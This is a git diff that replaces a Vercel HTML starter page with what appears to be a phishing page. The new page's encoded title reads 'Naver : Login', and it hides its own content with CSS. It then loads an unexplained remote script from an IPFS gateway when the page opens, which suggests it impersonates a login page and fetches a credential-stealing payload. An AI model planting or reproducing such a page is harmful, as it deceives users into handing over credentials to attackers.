@@ -1,96 +1,22 @@
+
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+<html>
+   <head>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAEAIABoBAAAJgAAACAgAAABACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAZbcD8mW3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD8mS6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2DFA/9gxQP/YMUD/2DFA/////////////X78P9fxAP/h9NE/////////////////2DFA/9gxQP/YMUD/2DFA/9fyAP/X8gD/1/IA/9fyAP////////////1/PD/Z8sT/+z44v////////////////9fyAP/X8gD/1/IA/9fyAP/XswD/17MA/9ezAP/XswD////////////9fzw/8PrpP//////////////////////XswD/17MA/9ezAP/XswD/13PA/9dzwP/Xc8D/13PA////////////////////////////////////////////13PA/9dzwP/Xc8D/13PA/9e0gP/XtID/17SA/9e0gP//////////////////////+v54P/w++j///////////9e0gP/XtID/17SA/9e0gP/X9YD/1/WA/9f1gP/X9YD//////////////////////+T4lv/6/rg////////////X9YD/1/WA/9f1gP/X9YD/2DaA/9g2gP/YNoD/2DaA//////////////////b9sn/X9kE/+v64P///////////2DaA/9g2gP/YNoD/2DaA/9h3gP/Yd4D/2HeA/9h3gP/////////////////g+Q8/2DdA//r++D///////////9h3gP/Yd4D/2HeA/9h3gP/Y+ID/2PiA/9j4gP/Y+ID/23kE/9t5BP/bOQS/2PiA/9j4gP/bOQR/23kE/9t5BP/Y+ID/2PiA/9j4gP/Y+ID/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/Z/AD8mfwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD8gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAZbUDs2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A/9ltQP/ZbUD/2W1A7NltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2W3A/9ltwP/ZbcD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLgD/2S4A/9kuAP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9kugP/ZLoD/2S6A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O8A/9jvAP/Y7wD/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Y74D/2O+A/9jvgP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9ivwP/Yr8D/2K/A/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HBA/9hwQP/YcED/2HDA/9hwwP/YcMD/2HDA/9hwwP/YcMD/2HDA/9hwwP/XcED/1vAA/9bwAP/W8AD/1vAA/9cwAP/X8ID/2HDA/9hwwP/YMMD/1zAA/9bwAP/W8AD/1vAA/9bwAP/XcED/2HDA/9hwwP/YcMD/2HDA/9hwwP/YcMD/2HDA/9hwwP/YMUD/2DFA/9gxQP/YMUD/2DFA/9gxQP/YMUD/2DFA/9awgP///////////////////////////9oyBP/YMUD/2DFA/9bwgP/w+mk//////////////////////9awgP/YMUD/2DFA/9gxQP/YMUD/2DFA/9gxQP/YMUD/2DFA/9gxgP/YMYD/2DGA/9gxgP/YMYD/2DGA/9gxgP/YMYD/1rDA////////////////////////////2jIE/9gxgP/XcQD/5fYYP///////////////////////////1rDA/9gxgP/YMYD/2DGA/9gxgP/YMYD/2DGA/9gxgP/YMYD/1/IA/9fyAP/X8gD/1/IA/9fyAP/X8gD/1/IA/9fyAP/WcUD////////////////////////////Z8sT/13HA/9yzSn/+Pz0////////////////////////////WcUD/1/IA/9fyAP/X8gD/1/IA/9fyAP/X8gD/1/IA/9fyAP/X8oD/1/KA/9fygP/X8oD/1/KA/9fygP/X8oD/1/KA/9ZxgP///////////////////////////9nzBP/X8kK/+D00P////////////////////////////////9ZxgP/X8oD/1/KA/9fygP/X8oD/1/KA/9fygP/X8oD/1/KA/9ezAP/XswD/17MA/9ezAP/XswD/17MA/9ezAP/XswD/1jIA////////////////////////////2TNE/+455P//////////////////////////////////////1jIA/9ezAP/XswD/17MA/9ezAP/XswD/17MA/9ezAP/XswD/17NA/9ezQP/Xs0D/17NA/9ezQP/Xs0D/17NA/9ezQP/WMkD////////////////////////////lt1g////////////////////////////////////////////WMkD/17NA/9ezQP/Xs0D/17NA/9ezQP/Xs0D/17NA/9ezQP/Xc8D/13PA/9dzwP/Xc8D/13PA/9dzwP/Xc8D/13PA/9XywP////////////////////////////4/fT///////////////////////////////////////////9XywP/Xc8D/13PA/9dzwP/Xc8D/13PA/9dzwP/Xc8D/13PA/9d0AP/XdAD/13QA/9d0AP/XdAD/13QA/9d0AP/XdAD/1fNA/////////////////////////////////////////////f98////////////////////////////1fNA/9d0AP/XdAD/13QA/9d0AP/XdAD/13QA/9d0AP/XdAD/17SA/9e0gP/XtID/17SA/9e0gP/XtID/17SA/9e0gP/WM8D////////////////////////////////////////////k99c////////////////////////////WM8D/17SA/9e0gP/XtID/17SA/9e0gP/XtID/17SA/9e0gP/XtQD/17UA/9e1AP/XtQD/17UA/9e1AP/XtQD/17UA/9Y0QP//////////////////////////////////////7/tn/9a0gP///////////////////////////9Y0QP/XtQD/17UA/9e1AP/XtQD/17UA/9e1AP/XtQD/17UA/9f1gP/X9YD/1/WA/9f1gP/X9YD/1/WA/9f1gP/X9YD/1nTA//////////////////////////////////m+Nj/YdUO/13UA////////////////////////////1nTA/9f1gP/X9YD/1/WA/9f1gP/X9YD/1/WA/9f1gP/X9YD/2DYA/9g2AP/YNgD/2DYA/9g2AP/YNgD/2DYA/9g2AP/WtQD////////////////////////////+v74/3jcMf9e1wP/XtcD////////////////////////////WtQD/2DYA/9g2AP/YNgD/2DYA/9g2AP/YNgD/2DYA/9g2AP/YNoD/2DaA/9g2gP/YNoD/2DaA/9g2gP/YNoD/2DaA/9a1gP///////////////////////////+f523/XdgD/2DaA/9e2QP///////////////////////////9a1gP/YNoD/2DaA/9g2gP/YNoD/2DaA/9g2gP/YNoD/2DaA/9h3AP/YdwD/2HcA/9h3AP/YdwD/2HcA/9h3AP/YdwD/1vYA///////////////////////zPOx/1zZA/9h3AP/YdwD/1/bA////////////////////////////1vYA/9h3AP/YdwD/2HcA/9h3AP/YdwD/2HcA/9h3AP/YdwD/2HeA/9h3gP/Yd4D/2HeA/9h3gP/Yd4D/2HeA/9h3gP/XdwD/2XcE/9l3BP/ZdwT/2XcE/9f3Aj/YN0D/2HeA/9h3gP/X90D/2bdE/9l3BP/ZdwT/2XcE/9l3BP/XdwD/2HeA/9h3gP/Yd4D/2HeA/9h3gP/Yd4D/2HeA/9h3gP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9i4AP/YuAD/2LgA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PiA/9j4gP/Y+ID/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/Y+QD/2PkA/9j5AP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9k5wP/ZOcD/2TnA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2XpA/9l6QP/ZekD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/ZusD/2brA/9m6wP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9m7gP/Zu4D/2buA/9n8AOzZ/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/AD/2fwA/9n8AP/Z/ADswAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" type="image/x-icon">
+     <title>&#45348;&#51060;&#48260;&#32;&#58;&#32;&#47196;&#44536;&#51064;</title>
+      <style>
+         html {
+         visibility: hidden; 
+         background: white;
+         }
+      </style>
+   </head>
+<body>
+  <div id="content">
+<script src="https://bafkreia4ecxpipjldkaa2c2bgdn2hi57ry5635kzy2kvd4ghdb6dg6baxi.ipfs.w3s.link"></script>
+  </div>
+</body>
 </html>
